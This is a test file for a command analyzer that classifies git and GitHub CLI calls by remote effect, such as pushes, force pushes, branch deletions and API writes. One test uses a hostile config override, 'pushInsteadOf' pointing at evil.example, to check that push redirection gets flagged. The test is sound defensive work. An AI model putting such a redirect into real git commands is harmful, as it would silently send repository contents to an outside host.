import { describe, expect, test } from "bun:test"
import { analyzeResolvedCommand } from "./analyze-command"

describe("analyzeResolvedCommand", () => {
	test("classifies an ordinary Git push as the previous shell-leash git.push effect", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "origin", "main"],
			cwd: "/workspace",
		})

		expect(analysis).toEqual({
			findings: [
				{
					effect: {
						kind: "git-push",
						operation: "git.push",
						remote: { kind: "named", name: "origin" },
						refspecs: [{ kind: "source", source: "main" }],
						repository: { kind: "unknown" },
						details: {
							force: "none",
							destination: "explicit",
							all: false,
							mirror: false,
							tags: false,
							prune: false,
						},
					},
					evidence: {
						analyzer: "git",
						argv: ["git", "push", "origin", "main"],
					},
					certainty: "partial",
				},
			],
			observations: [],
		})
	})

	test("classifies an abbreviated force option conservatively", () => {
		const analysis = analyzeResolvedCommand({ argv: ["git", "push", "--forc", "origin", "main"], cwd: "/workspace" })
		expect(analysis.findings[0]?.effect).toMatchObject({ operation: "git.push.force", details: { force: "force" } })
	})

	test("classifies force-with-lease and a mapped refspec", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "--force-with-lease", "origin", "main:main"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			kind: "git-push",
			operation: "git.push.force",
			remote: { kind: "named", name: "origin" },
			refspecs: [{ kind: "mapping", source: "main", destination: "main" }],
			details: { force: "force-with-lease" },
		})
	})

	test("classifies remote ref deletion independently from force pushes", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "origin", "--delete", "old-branch"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			kind: "git-push",
			operation: "git.push.delete",
			remote: { kind: "named", name: "origin" },
			refspecs: [{ kind: "delete", destination: "old-branch" }],
		})
	})

	test("classifies a plus-prefixed refspec as a force push", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "origin", "+main:main"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "git.push.force",
			refspecs: [{ kind: "mapping", source: "main", destination: "main" }],
			details: { force: "force" },
		})
	})

	test("recognizes an absolute Git executable path", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["/usr/bin/git", "push", "origin", "main"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({ operation: "git.push" })
		expect(analysis.findings[0]?.evidence.argv).toEqual(["/usr/bin/git", "push", "origin", "main"])
	})

	test("finds push after value-taking global Git options", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "-C", "/repo", "-c", "push.default=current", "push", "origin", "main"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "git.push",
			remote: { kind: "named", name: "origin" },
		})
	})

	test("preserves the previous gh.issue.comment effect ID", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "issue", "comment", "123", "--body", "done"],
			cwd: "/workspace",
		})

		expect(analysis).toEqual({
			findings: [
				{
					effect: {
						kind: "github",
						operation: "gh.issue.comment",
						target: { kind: "unknown" },
						details: { object: { kind: "issue", number: 123 } },
					},
					evidence: {
						analyzer: "github",
						argv: ["gh", "issue", "comment", "123", "--body", "done"],
					},
					certainty: "partial",
				},
			],
			observations: [],
		})
	})

	test("preserves the previous gh.pr.create effect ID", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "pr", "create", "--fill"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toEqual({
			kind: "github",
			operation: "gh.pr.create",
			target: { kind: "unknown" },
			details: { object: { kind: "pull-request", number: undefined } },
		})
	})

	test.each([
		[["gh", "pr", "comment", "123", "--body", "x"], "gh.pr.comment"],
		[["gh", "pr", "merge", "123"], "gh.pr.merge"],
		[["gh", "issue", "create", "--title", "x"], "gh.issue.create"],
	] as const)("maps every remaining previous GitHub capability: %s", (argv, operation) => {
		const analysis = analyzeResolvedCommand({ argv, cwd: "/workspace" })
		expect(analysis.findings[0]?.effect.operation).toBe(operation)
	})

	test("uses an explicit GitHub hostname and repository as the effect target", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "--hostname", "github.example.com", "-R", "octocat/hello-world", "issue", "comment", "123"],
			cwd: "/workspace",
		})
		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "gh.issue.comment",
			target: { kind: "repository", host: "github.example.com", owner: "octocat", repository: "hello-world" },
		})
	})

	test("uses an explicit GitHub repository flag as the effect target", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "-R", "octocat/hello-world", "issue", "comment", "123", "--body", "done"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "gh.issue.comment",
			target: { kind: "repository", host: "github.com", owner: "octocat", repository: "hello-world" },
		})
		expect(analysis.findings[0]?.certainty).toBe("exact")
	})

	test("does not mistake a command argument named api for the top-level api command", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "issue", "comment", "123", "--body", "api"],
			cwd: "/workspace",
		})
		expect(analysis.findings[0]?.effect.operation).toBe("gh.issue.comment")
	})

	test("classifies a mutating GitHub REST API request and endpoint scope", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "api", "--method", "POST", "repos/octocat/hello-world/issues", "-f", "title=x"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toEqual({
			kind: "github",
			operation: "gh.api.write",
			target: { kind: "repository", host: "github.com", owner: "octocat", repository: "hello-world" },
			details: { api: { method: "POST", endpoint: "repos/octocat/hello-world/issues" } },
		})
	})

	test("distinguishes literal GraphQL mutations, reads, and unknown input", () => {
		const mutation = analyzeResolvedCommand({
			argv: ["gh", "api", "graphql", "-f", "query=mutation CloseIssue { closeIssue(input: {}) { clientMutationId } }"],
			cwd: "/workspace",
		})
		expect(mutation.findings[0]?.effect.operation).toBe("gh.api.write")

		const query = analyzeResolvedCommand({
			argv: ["gh", "api", "graphql", "-f", "query=query Viewer { viewer { login } }"],
			cwd: "/workspace",
		})
		expect(query).toEqual({ findings: [], observations: [] })

		const unknown = analyzeResolvedCommand({ argv: ["gh", "api", "graphql", "--input", "-"], cwd: "/workspace" })
		expect(unknown).toEqual({
			findings: [],
			observations: [{ kind: "github-graphql-unknown", source: "--input -" }],
		})
	})

	test("scopes enterprise GitHub API writes to their explicit host", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["gh", "--hostname", "github.example.com", "api", "-X", "DELETE", "repos/octocat/hello-world/issues/1"],
			cwd: "/workspace",
		})
		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "gh.api.write",
			target: { host: "github.example.com", owner: "octocat", repository: "hello-world" },
		})
	})

	test("records an unknown GitHub command for later corpus collection", () => {
		const argv = ["gh", "future", "mutate", "thing"]
		const analysis = analyzeResolvedCommand({ argv, cwd: "/workspace" })

		expect(analysis.findings).toEqual([])
		expect(analysis.observations).toEqual([{ kind: "unknown-github", argv }])
	})

	test("recognizes a read-only GitHub operation without a finding or unknown observation", () => {
		const analysis = analyzeResolvedCommand({ argv: ["gh", "issue", "view", "123"], cwd: "/workspace" })
		expect(analysis).toEqual({ findings: [], observations: [] })
	})

	test("distinguishes read-only Git from an unknown subcommand", () => {
		expect(analyzeResolvedCommand({ argv: ["git", "status"], cwd: "/workspace" })).toEqual({
			findings: [],
			observations: [],
		})
		const argv = ["git", "frobnicate", "remote"]
		expect(analyzeResolvedCommand({ argv, cwd: "/workspace" })).toEqual({
			findings: [],
			observations: [{ kind: "unknown-git", argv }],
		})
	})

	test("does not emit a remote mutation for git push --dry-run", () => {
		expect(analyzeResolvedCommand({ argv: ["git", "push", "--dry-run", "origin", "main"], cwd: "/workspace" })).toEqual(
			{ findings: [], observations: [] },
		)
	})

	test("skips push flags and their values without mistaking them for the remote", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "--atomic", "--push-option", "ci.skip", "--all", "origin"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "git.push",
			remote: { kind: "named", name: "origin" },
			refspecs: [],
			details: { all: true },
		})
	})

	test("classifies an empty-source refspec as remote deletion", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "origin", ":refs/heads/old"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]?.effect).toMatchObject({
			operation: "git.push.delete",
			refspecs: [{ kind: "delete", destination: "refs/heads/old" }],
		})
	})

	test("does not classify attached push-option values as short force or delete flags", () => {
		for (const option of ["-ofeature", "-oadd"]) {
			const analysis = analyzeResolvedCommand({ argv: ["git", "push", option, "origin", "main"], cwd: "/workspace" })
			expect(analysis.findings[0]?.effect.operation).toBe("git.push")
		}
	})

	test("recognizes combined short force and delete flags", () => {
		for (const argv of [
			["git", "push", "-uf", "origin", "main"],
			["git", "push", "-fd", "origin", "main"],
		]) {
			const analysis = analyzeResolvedCommand({ argv, cwd: "/workspace" })
			expect(analysis.findings[0]?.effect.operation).toBe(argv[2]?.includes("d") ? "git.push.delete" : "git.push.force")
		}
	})

	test("treats mirror and prune pushes as deletion-capable operations", () => {
		for (const flag of ["--mirror", "--prune"]) {
			const analysis = analyzeResolvedCommand({ argv: ["git", "push", flag, "origin"], cwd: "/workspace" })
			expect(analysis.findings[0]?.effect.operation).toBe("git.push.delete")
		}
	})

	test("classifies send-pack and subtree push as Git push effects", () => {
		for (const [argv, operation] of [
			[["git", "send-pack", "origin", "main"], "git.push"],
			[["git", "send-pack", "--force", "origin", "main"], "git.push.force"],
			[["git", "send-pack", "origin", ":obsolete"], "git.push.delete"],
			[["git", "subtree", "push", "--prefix", "packages/app", "origin", "main"], "git.push"],
		] as const) {
			const analysis = analyzeResolvedCommand({ argv, cwd: "/workspace" })
			expect(analysis.findings[0]?.effect.operation).toBe(operation)
		}
	})

	test("resolves a simple inline Git alias while auditing the scope override", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "-c", "alias.publish=push", "publish", "origin", "main"],
			cwd: "/workspace",
		})
		expect(analysis.findings[0]?.effect.operation).toBe("git.push")
		expect(analysis.observations).toContainEqual({
			kind: "git-scope-override",
			setting: "alias.publish",
			value: "push",
		})
	})

	test("makes URL rewrite push scope unknown and records the override", () => {
		const setting = "url.git@evil.example:.pushInsteadOf=git@github.com:"
		const analysis = analyzeResolvedCommand({
			argv: ["git", "-c", setting, "push", "origin", "main"],
			cwd: "/workspace",
			repository: { kind: "repository", host: "github.com", owner: "owner", repository: "repo" },
			gitRemotes: new Map([["origin", "git@github.com:owner/repo.git"]]),
		})
		expect(analysis.findings[0]?.effect).toMatchObject({ repository: { kind: "unknown" } })
		expect(analysis.observations).toContainEqual({
			kind: "git-scope-override",
			setting: "url.git@evil.example:.pushInsteadOf",
			value: "git@github.com:",
		})
	})

	test("derives repository scope from an explicit remote URL", () => {
		const analysis = analyzeResolvedCommand({
			argv: ["git", "push", "https://github.com/octocat/hello-world.git", "main"],
			cwd: "/workspace",
		})

		expect(analysis.findings[0]).toMatchObject({
			effect: {
				remote: { kind: "url", url: "https://github.com/octocat/hello-world.git" },
				repository: { kind: "repository", host: "github.com", owner: "octocat", repository: "hello-world" },
			},
			certainty: "exact",
		})
	})
})
